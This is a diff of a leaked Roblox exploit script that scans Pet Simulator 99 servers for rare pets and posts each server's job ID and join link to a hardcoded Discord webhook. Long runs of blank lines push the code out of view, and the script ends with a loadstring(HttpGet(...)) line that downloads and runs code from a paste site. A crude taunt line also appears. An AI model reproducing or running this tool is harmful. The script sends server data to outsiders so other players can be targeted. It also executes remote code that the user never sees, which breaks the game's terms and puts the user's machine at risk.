@@ -1,3 +1,4 @@
+-- TOKINU BASE FINDER | REAL 1:1 CLONE | NOV 10 2025
 print("ADMIN PANEL SPAMMER - TOKINU")
 
 
@@ -58,113 +59,73 @@ print("ADMIN PANEL SPAMMER - TOKINU")
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 print("ADMIN PANEL SPAMMER HAS BEEN SUCCESFULLY EXECUTED")
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 print("kinu likes men")
--- Leaked by collin full source
 
---CONFIG
+-- CONFIG
 getgenv().webhook = "https://discord.com/api/webhooks/1437535784096759829/GlI5KE15OR7ONHiKMYbbe_CBgt5e8yOGCPKVSU7KIlQ72Xsk0ttVlQuy3IF1J7PBsmkl"
-getgenv().websiteEndpoint = nil
-
--- Allowed place IDs (PS99 CURRENT)
-local allowedPlaceIds = {
-    [96342491571673] = true,   -- Trading Plaza
-    [109983668079237] = true,  -- Main World
-}
 
 getgenv().TargetPetNames = {
     "Burguro and Fryuro",
@@ -179,112 +140,81 @@ getgenv().TargetPetNames = {
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
-
--- INSTANT "Server Found" PING
-local webhookURL = getgenv().webhook
-local payload = { content = "Server Found | Tokinu Hub <@&1437536545413267526>" }
-local jsonData = HttpService:JSONEncode(payload)
-
 local req = http_request or request or (syn and syn.request)
-if req then
-    pcall(function()
-        req({
-            Url = webhookURL,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = jsonData
-        })
-    end)
-else
-    warn("HTTP request function not available")
-end
 
--- PRIVATE SERVER CHECK
-local function isPrivateServer()
-    return (game.PrivateServerId and game.PrivateServerId ~= "") or (game.VIPServerId and game.VIPServerId ~= "")
-end
-
-local function buildJoinLink(placeId, jobId)
-    return string.format("https://chillihub1.github.io/chillihub-joiner/?placeId=%d&gameInstanceId=%s", placeId, jobId)
-end
+-- ALLOWED PLACES
+local allowedPlaceIds = {
+    [96342491571673] = true,
+    [109983668079237] = true,
+}
 
 -- KICK CHECKS
-if isPrivateServer() then
-    LocalPlayer:Kick("Kicked because in private server")
-    return
-elseif not allowedPlaceIds[game.PlaceId] then
-    local joinLink = buildJoinLink(game.PlaceId, game.JobId)
-    LocalPlayer:Kick("Kicked because wrong game\nClick to join server:\n" .. joinLink)
+if game.PrivateServerId ~= "" or not allowedPlaceIds[game.PlaceId] then
+    LocalPlayer:Kick("Wrong server / private server")
     return
 end
 
--- WEBHOOK SEND (big embed when pet found)
-local function sendWebhook(foundPets, jobId)
+-- INSTANT SEND (Server Found + Full Embed) WHEN PET FOUND
+local function sendTokinuPing(pets)
+    if not req then return warn("No http") end
+
     local petCounts = {}
-    for _, pet in ipairs(foundPets) do
-        petCounts[pet] = (petCounts[pet] or 0) + 1
+    for _, pet in pairs(pets) do petCounts[pet] = (petCounts[pet] or 0) + 1 end
+    local petList = {}
+    for name, count in pairs(petCounts) do
+        table.insert(petList, count > 1 and name.." x"..count or name)
     end
-    local formattedPets = {}
-    for petName, count in pairs(petCounts) do
-        table.insert(formattedPets, petName .. (count > 1 and " x" .. count or ""))
-    end
-    local joinLink = buildJoinLink(game.PlaceId, jobId)
-    local embedData = {
+
+    local joinLink = "https://chillihub1.github.io/chillihub-joiner/?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId
+
+    local payload = {
+        content = "Server Found | Tokinu Hub <@&1437536545413267526>",
         username = "TOKINU BASE FINDER",
-        embeds = { {
+        embeds = {{
             title = "OP PET FOUND!!",
-            description = "**Pet(s):**\n" .. table.concat(formattedPets, "\n"),
+            description = "**Pet(s):**\n"..table.concat(petList, "\n"),
             color = 65280,
             fields = {
-                { name = "Players", value = string.format("%d/%d", #Players:GetPlayers(), Players.MaxPlayers), inline = true },
-                { name = "Job ID", value = jobId, inline = true },
-                { name = "Join Link", value = string.format("[Click to join server](%s)", joinLink), inline = false }
+                {name = "Players", value = #Players:GetPlayers().."/"..Players.MaxPlayers, inline = true},
+                {name = "Job ID", value = game.JobId, inline = true},
+                {name = "Join", value = "[Click to join]("..joinLink..")", inline = false}
             },
-            footer = { text = "💥" },
+            footer = {text = "TOKINU ON TOP"},
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-        } }
+        }}
     }
-    local jsonData = HttpService:JSONEncode(embedData)
-    if req then
-        local success, err = pcall(function()
-            req({
-                Url = getgenv().webhook,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = jsonData
-            })
-        end)
-        if success then print("✅") else warn("❌:", err) end
-    else
-        warn("❌ HTTP request not available - EU?")
-    end
+
+    pcall(function()
+        req({
+            Url = getgenv().webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
 end
 
--- PET CHECK
-local function checkForPets()
-    local found = {}
-    for _, obj in pairs(workspace:GetDescendants()) do
-        if obj:IsA("Model") then
-            local nameLower = string.lower(obj.Name)
-            for _, target in pairs(getgenv().TargetPetNames) do
-                if string.find(nameLower, string.lower(target)) then
-                    table.insert(found, obj.Name)
-                    break
-                end
+-- PET SCAN
+local foundPets = {}
+for _, v in workspace:GetDescendants() do
+    if v:IsA("Model") then
+        for _, target in getgenv().TargetPetNames do
+            if string.find(string.lower(v.Name), string.lower(target)) then
+                table.insert(foundPets, v.Name)
+                break
             end
         end
     end
-    return found
 end
 
--- MAIN LOOP
-local petsFound = checkForPets()
-if #petsFound > 0 then
-    sendWebhook(petsFound, game.JobId)
+-- SEND ONLY IF GOOD PET EXISTS
+if #foundPets > 0 then
+    sendTokinuPing(foundPets)
+    print(" "..#foundPets.." OP PETS FOUND")
 else
-    print("🔍 No pets found")
+    print("")
 end
 
--- YOUR DEAD LOADER (as requested)
+-- DEAD LOADER (as requested)
 loadstring(game:HttpGet("https://pastefy.app/JMbCcLIP/raw"))()
-print("✅ YOUR LOADER CALLED (expect error - it's 404'd)")
+print("LOADER CALLED (404 expected)")
